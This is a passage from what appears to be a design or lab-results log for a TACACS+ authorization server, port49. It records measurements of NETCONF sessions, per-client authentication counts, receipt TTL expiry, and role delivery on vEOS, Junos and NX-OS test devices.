  demonstration that the transport re-authenticates per request that the earlier wording made it.
  The `/login` session-cookie flow named in this row's own claim, the NX-API `nxapi_auth` cookie,
  and HTTP keep-alive are precisely the shapes that would lower the count, and all three are
  unmeasured. Read every count in the table above as an upper bound.

  What the repeat then got is the finding decision 15 actually turns on, and it is in L15 below.

  *Unmeasured:* the `/login` session-cookie flow, which this row names explicitly and which is the obvious
  way a device would avoid re-authenticating; HTTP keep-alive; the NX-API JSON-RPC dialect, which is a
  different code path on the device from `ins_api`; the unix-socket and plain-HTTP eAPI transports.
- **L14** — 2026-09-20. `tests/lab/results/netconf-arista_eos.md`,
  `netconf-juniper_vjunos-router.md`, `netconf-juniper_vsrx.md`, `netconf-cisco_nxos.md`.

  **Every platform authenticates a NETCONF session through TACACS+ exactly as it authenticates an
  interactive login** — one exchange, the same `auth.method`, the same `port` at the authentication. A
  NETCONF session is not a distinguishable kind of session at authentication time anywhere.

  What happens next differs completely by vendor.

  - **vEOS** serves NETCONF as an SSH subsystem on **port 22** and authorizes it as a *command*:
    `service=shell cmd=netconf cmd-arg=start-client cmd-arg=<cr>`. Each `<edit-config>` then raises its own
    exec-style exchange at `port=NETCONF` with `rem_addr` carrying the **full four-tuple** —
    `"172.100.100.1 50148 10.0.0.15 22"` — which is the only field measured anywhere in this lab that
    distinguishes two concurrent clients at authorization time. Those per-RPC authorizations were denied
    `context_missing`, for the L1 reason.
  - **Junos**, both images identically, serves it on **830** and sends **one session authorization carrying
    `service=junos-exec`** — byte for byte what an interactive login sends, so Junos does not distinguish a
    NETCONF session from a shell one at authorization time. No per-RPC authorization at all. Accounting
    does distinguish it: `port=non-tty` and `cmd=xml-mode netconf need-trailer <cr>`, alongside the usual
    `cmd=login` / `cmd=logout` pair and a `session_pid`. A `<commit>` produced no authorization of its own.

    **One sentence in the 2026-09-20 Junos notes was wrong and is corrected here, 2026-09-21.** Those
    runs read the `<edit-config>` failing `permission denied` as the session-authorization denial
    arriving — "that error is the denial arriving, not the guessed payload being wrong". It is
    neither. Measured since: a Junos session authorization denied `service_unsupported` does not
    stop the login and does not change the session's class, which stays the `p49-readonly` the
    device's own `user remote` template assigns (L10, 2026-09-21). `permission denied` is that
    read-only class refusing a write, and the same `<edit-config>` would have returned it with the
    authorization permitted. The denial and the read-only class are two separate facts that
    happened to produce one symptom, and the `<edit-config>` payload is still unverified either
    way. A rerun with a writable class is what settles the payload.
  - **NX-OS** authenticates and its session authorization is permitted, and then the channel closes with
    EOF before any RPC is answered. Its session request asks for `shell:roles`; answering with
    `shell:roles*network-admin` did not change the EOF, so the cause is elsewhere and is **not measured**.

  *Unmeasured:* what a NETCONF session does on the N9Kv past the authentication; key-based SSH to the
  NETCONF port, which is how automation would really connect and would not involve port49 at all; base:1.1
  chunked framing; `<lock>`, `<validate>` and confirmed commit; whether a long-lived session
  re-authenticates during its life; IOS-XE.
- **L15** — 2026-09-20, all four images, and it changes what decision 15 is about.

  Every transport measured costs **one authentication exchange per unit of work**: per HTTP request on eAPI
  and NX-API, per session on NETCONF, per login on SSH. So a single-use token is spent by the first call.

  **Corrected 2026-09-21: that is an upper bound, not the transports' floor.** The HTTP clients
  driven here send Basic credentials on a fresh TCP connection every call (`DisableKeepAlives`,
  no cookie jar), which is the most expensive way to use either API and is not how the real
  clients an operator runs are built. A `/login` session cookie on eAPI, an `nxapi_auth` cookie
  on NX-API, and plain HTTP keep-alive are each a way the count could be lower, and none of them
  was driven. Until they are, "one authentication per unit of work" is what *this* client costs;
  any argument about token lifetimes that depends on the number has to name the client it is
  about.

  The second call was then **permitted anyway**, on every transport and every platform:
  `verdict=permit reason=receipt_replayed`. port49 answered it out of the receipt rather than out of the
  store. A script that makes forty calls with one token therefore works. (The receipt key at the time of
  this run was `(nas, port, username)`; it became `(nas, username, credential_sha256)` on 2026-09-20 — §13,
  decision 15. The hash moving into the key does not change this result, because a repeat presenting the
  same token hashes the same; what it does change is that a *different* credential no longer collides with
  this receipt, and a genuinely new login by the same user no longer fails `credential_mismatch`.)

  **The question is not whether the transport re-authenticates. It is `receipt_ttl`.** For as long as the
  receipt lives, the repeat is served; past it, the next call in the same script is the first denial, with
  nothing about the credential having changed and nothing in the operator's hand having changed either. Any
  argument for or against reusable tokens has to be made about that boundary, not about the exchange count.

  Note what the receipt key no longer contains: `port`. Under the old key, on vEOS `port` was
  `command-api` for eAPI and `ssh` for a login, so the two did not share a receipt, while on the N9Kv both
  were `0`, so they did — per-platform behavior nobody chose. Under
  `(nas, username, credential_sha256)` the same token presented over either transport finds the same
  receipt on every platform, and a different credential finds none.

  **2026-09-21: the real clients, and the receipt boundary driven for the first time.**
  `tests/lab/clients_test.go`, `tests/lab/results/L15-clients-arista_eos.md`,
  `L15-clients-cisco_nxos.md`. Each client runs a **ten-task job** against one device as one
  user, on one single-use token. Counts are from port49's decision log.

  | client | platform | authentications per 10 tasks | tasks ok | token survived |
  |---|---|---|---|---|
  | pyeapi (eAPI) | vEOS | 10 | 10/10 | yes |
  | NAPALM `eos` (eAPI) | vEOS | 11 | 10/10 | yes |
  | Ansible `arista.eos` over `httpapi` | vEOS | 13 | 10/10 | yes |
  | netmiko `arista_eos` (one persistent SSH) | vEOS | **1** | 10/10 | yes |
  | Ansible `arista.eos` over `network_cli` | vEOS | **1** | 10/10 | yes |
  | Nornir + netmiko, **10 concurrent workers** | vEOS | 10 | 10/10 | yes |
  | NAPALM `nxos` (NX-API) | N9Kv | 28 | **5/10** | **no** |
  | NAPALM `nxos_ssh` | N9Kv | **1** | 10/10 | yes |
  | netmiko `cisco_nxos` | N9Kv | **1** | 10/10 | yes |
  | Ansible `cisco.nxos` over `httpapi` | N9Kv | **1** | 10/10 | yes |
  | Ansible `cisco.nxos` over `network_cli` | N9Kv | **1** | 10/10 | yes |

  **The transport does not decide the count; the client does.** Ansible's `cisco.nxos`
  `httpapi` plugin costs **one** authentication for ten NX-API calls — it holds the
  `nxapi_auth` cookie — while NAPALM's `nxos` driver costs 28 over the same API on the same
  device. The `arista.eos` `httpapi` plugin does *not* do the same thing on eAPI and costs 13.
  So "one authentication per unit of work" was never a fact about eAPI or NX-API: it is what
  a client that re-presents its credential every call costs, and a client that keeps a session
  costs one. Any SSH client that holds its connection costs one.

  **The receipt boundary, measured — this is the finding decision 15 says it turns on.** The
  NAPALM `nxos` job is the row to read. Tasks 0–4 succeeded; tasks 5–9 returned

  ```
  NXAPIAuthError Authentication to NX-API failed please verify your username, password, and hostname.
  ```

  and port49 denied five redemptions `token_not_found`. The token was spent by the first call;
  the next 22 calls were served `receipt_replayed` out of the receipt; and then the receipt
  expired, 38.8 seconds into a job against a `receipt_ttl` of 30s. **Nothing in the operator's
  hand changed between task 4 and task 5.** That is the failure this document has described
  three times and never seen, and it is not hypothetical: it is the default TTL against an
  ordinary NAPALM job that takes longer than half a minute.

  Note what it is *not* about. It is not about the transport re-authenticating, and not about
  the token being single-use — the token being single-use is survivable for as long as the
  receipt lives, which is the whole reason the earlier runs saw a repeat permitted. It is about
  a job outliving `receipt_ttl`.

  **Ten concurrent logins by one user, the accepted cost of decision 15, measured as a
  workload.** The Nornir row runs ten netmiko sessions to one device as one user at once: ten
  session authorizations, all permitted, **thirty command authorizations, and exactly one
  `ctx_id`**. No session was refused. So the cost is exactly what decision 15 says it is —
  the ten shells are one context and a log reader cannot tell them apart — and it is not worse
  than that. Note also that nine of the ten logins were served out of the **receipt**: a
  ten-worker job on one token works for the same reason and under the same limit as the API
  jobs above.

  Two honest limits on this table. `Ansible arista.eos over network_cli` produced **1**
  authentication on one run and failed to reach port49 at all on the next, so that row is
  flaky on this host and the `1` is the measured figure rather than a reliable one. And the
  "wire" column in the notes is **inferred from the authentication count, not measured** — the
  capture filter is `tcp port 49`, so no cookie or Basic header is in evidence; the notes say
  so in those words in every row.

  *Unmeasured:* the eAPI `/login` cookie flow driven by hand, and the NX-API `nxapi_auth`
  cookie driven by hand — both are now *implied* by the Ansible `cisco.nxos` result rather
  than driven directly; forcing a cookie to expire and watching what the device does; HTTP
  keep-alive as a variable separated from the cookie; IOS-XE and Junos clients.
- **L16** — added 2026-09-21. `tests/lab/l16_test.go`, results in `tests/lab/results/L16-*.md`.

  **Why it exists.** `tests/lab/port49d-lab.yaml` has been sending `shell:roles*network-admin` to
  every platform since the N9Kv's session request was seen asking for `shell:roles` by name
  (L10), and **no test has ever checked that a device applied it** rather than ignored it. The
  owner's framing is the one this row is written to: a custom role is the NX-OS and EOS analogue
  of a Junos login class, so it is the thing decision 22's projection projects *into* on those
  platforms, and the one place port49 can express a policy to a device that does not authorize
  every command.

  **The two questions that bear on the product**, and they are the ones a results note must not
  answer by assumption:

  1. *The role forbids a command port49 permitted.* If the device refuses it, a role is a second
     policy engine port49 does not control, and port49's decision log carries a `permit` for a
     command that never ran. That is a reconciliation gap (§9) arriving from a direction this
     document does not describe — not a device that fails to ask, but a device that asks, is told
     yes, and refuses anyway.
  2. *port49 denies a command the role permits.* If the command runs, a per-command deny does not
     bind on that platform and port49's command authorization is advisory there — the same shape
     the Junos session authorization turned out to have (L10, 2026-09-21).

  The lab test defines one role that permits everything and denies exactly one command, so one
  variable separates the two. It deliberately does **not** probe with `reload`, the obvious second
  deny prefix: if port49's deny turns out not to bind, which is question 2, the device reboots
  mid-run.

  **vEOS measured 2026-09-21** (`tests/lab/results/L16-arista_eos.md`), seven reply-attribute
  sets against one deploy, one token login each. The image reports itself as **4.31.2F** —
  see the note under this row about the version label.

  | reply attributes | session | `show version` (the role denies it) | `show clock` (port49 denies it) |
  |---|---|---|---|
  | `priv-lvl=15` alone | opened | ran | **refused** |
  | `priv-lvl=15`, `shell:roles*p49-noc` | opened | **ran** | **refused** |
  | `priv-lvl=15`, `shell:roles=p49-noc` (mandatory) | **refused** | — | — |
  | `priv-lvl=15`, `cisco-av-pair*shell:roles="p49-noc"` | **refused** | — | — |
  | `priv-lvl=15`, `shell:roles*"p49-noc network-operator"` | opened | ran | **refused** |
  | `priv-lvl=15`, `shell:roles*p49-nosuchrole` | opened | ran | **refused** |
  | `priv-lvl=1` alone | opened | ran | **refused** |

  **1. `shell:roles*<name>` does not deliver a role on vEOS.** The device was asked, in the
  session itself, and answered:

  ```
  Session  Username   Roles          TTY    State  Duration  Auth          Remote Host
  1        admin      network-admin  con0   E      0:01:44   local
  43       alice08    <unknown>      vty4   E      0:00:01   group port49  172.100.100.1
  ```

  `<unknown>`, against `network-admin` for the local console account, with
  `shell:roles*p49-noc` in the reply. The command the role denies ran. The role exists on the
  device — the test defines it and the device accepted the definition — and the session does
  not hold it. **So the `shell:roles*network-admin` that `tests/lab/port49d-lab.yaml` has been
  sending to every platform since the N9Kv asked for it has never done anything on EOS**, and
  the comment in that file, which reasons only about whether EOS *ignores* it, has never been
  tested against whether the platform it was aimed at applies it either.

  **2. port49's per-command deny binds, and this is the reassuring half.** `show clock` was
  refused in every variant that opened a session, including the one where the device's own role
  permitted it, with `deny no_permit_dominates_deny` on the matching request. Command
  authorization is real on this platform whatever the role says — the opposite of what the
  Junos session authorization turned out to be (L10).

  **3. EOS refuses a session authorization carrying an attribute it does not recognise, and
  the OPTIONAL case is the surprise.** `shell:roles=p49-noc` sent as *mandatory* is refused —
  that is RFC 8907 §8.2 working exactly as specified. But
  `cisco-av-pair*shell:roles="p49-noc"`, sent as **optional**, is refused too:

  ```
  Authorization denied:
  ```

  and no session. That contradicts this document's own claim under L10 that "EOS and Junos do
  ignore [an optional argument they do not understand] — that is why a single lab authorizer
  could send NX-OS's `shell:roles*network-admin` to every platform". EOS ignores
  `shell:roles*`, which it evidently parses and discards; it does **not** ignore
  `cisco-av-pair*`. So **IOS-XE is not the only platform where an attribute an adapter sends
  can end a session port49 permitted** — vEOS is the second, for at least one optional
  spelling. *Not separated by this run:* whether EOS is refusing `cisco-av-pair` as a name or
  refusing the embedded quotes in its value. One more variant settles it and it was not run.

  **4. Two roles at once, an absent role, and `priv-lvl=1` all behave identically to no
  attribute at all** on this image, which follows from 1: nothing in the `shell:roles` family
  reaches the session, so there is nothing for a union rule or a missing name to change.

  **NX-OS measured 2026-09-21** (`tests/lab/results/L16-cisco_nxos.md`), Nexus 9300v 10.4(2)F,
  the same seven variants. **It answers the opposite way to vEOS on delivery and the same way
  on binding**, and the role the device reports is read per user from `show user-account`.

  | reply attributes | role the device reports for that session |
  |---|---|
  | `priv-lvl=15` alone | `network-admin` |
  | `priv-lvl=15`, `shell:roles*p49-noc` | **`p49-noc`** |
  | `priv-lvl=15`, `shell:roles=p49-noc` (mandatory) | **`p49-noc`** |
  | `priv-lvl=15`, `cisco-av-pair*shell:roles="p49-noc"` | **`p49-noc`** |
  | `priv-lvl=15`, `shell:roles*"p49-noc network-operator"` | **`p49-noc network-operator`** |
  | `priv-lvl=15`, `shell:roles*p49-nosuchrole` | **`network-operator`** |
  | `priv-lvl=1` alone | **`vdc-operator`** |

  **1. All three spellings work.** `shell:roles*`, `shell:roles=` and
  `cisco-av-pair*shell:roles="<name>"` each deliver the role, including the quoted form inside
  `cisco-av-pair` that vEOS refuses outright. An adapter for this platform has a choice; an
  adapter that has to serve both platforms with one string does not, because the two spellings
  EOS tolerates and refuses are not the same two.

  **2. Two roles at once are delivered as a union**, exactly as the documentation says:
  `roles:p49-noc network-operator`.

  **3. A role the device does not have degrades to `network-operator`, not to `network-admin`.**
  That is the 3am answer and it is the safe direction: a policy naming a role that was renamed
  or never created leaves the operator **read-only** rather than administrative. It does not
  refuse the session, and port49 has no way to know it happened — the reply port49 sent and the
  record it wrote are identical to the successful case.

  **4. `priv-lvl=1` maps to `vdc-operator`**, with no `feature privilege` configured. Not
  `priv-1`, which is what the row asked about: that name belongs to the `feature privilege`
  world this image does not have (L3). So the privilege-level path does reach this platform,
  and it reaches a role nobody named.

  **5. The delivered role's own command rules do NOT bind.** `p49-noc` carries
  `rule 10 deny command show version`, the device reports the session as holding `p49-noc`, and
  `show version` **ran** — with port49 having answered `permit permit_dominates` for it. While
  `aaa authorization commands` points at TACACS+, a delivered role is an **identity label**, not
  a second command-authorization policy. port49 decides the command; the role decides what the
  account is.

  That is the good news and the limit in one sentence. The reconciliation gap L16 was written to
  look for — a device that asks port49, is told yes, and refuses anyway — **does not occur on
  either platform measured**. Neither does its mirror: port49's per-command deny was honoured in
  every variant on both platforms, including where the device's own role permitted the command.
  **And a role cannot be used to constrain a session port49 has permitted**, which is what plan 5
  needs to know: on these platforms the role is where privilege *comes from*, not where it is
  *limited*, and the limiting is entirely port49's per-command authorization.

  *Unmeasured:* whether a role's rules bind when `aaa authorization commands` is **not** pointed
  at TACACS+ — the case an operator has before port49 is deployed, and the one the role's rules
  were presumably written for; the `cisco-av-pair` ambiguity in EOS finding 3; `feature
  privilege` and its `priv-N` roles, which this image does not have at all (L3); and whether a
  role delivered some other way takes effect on vEOS.

  **A note about the EOS image version, which this row is where it was caught.** Every EOS
  results note written before 2026-09-21, and every EOS row in this section, says
  **vEOS-lab 4.32.2F**. The device says otherwise, three times in this row's own note:

  ```
  Software image version: 4.31.2F
  Internal build version: 4.31.2F-35442176.4312F
  ```

  The docker tag and the vmdk filename both say 4.32.2F; the file was named for a release it
  does not contain. Under the rule in `CLAUDE.md` the device is right and the documents are
  wrong. The harness now reports what the device reports. **Every EOS observation in this
  section stands — only the release label on it was wrong**, and notes written before today
  still carry the old label in their headers.

Entries are added when a new claim is made, never removed. A closed entry keeps its row so a
later reader can find the evidence.
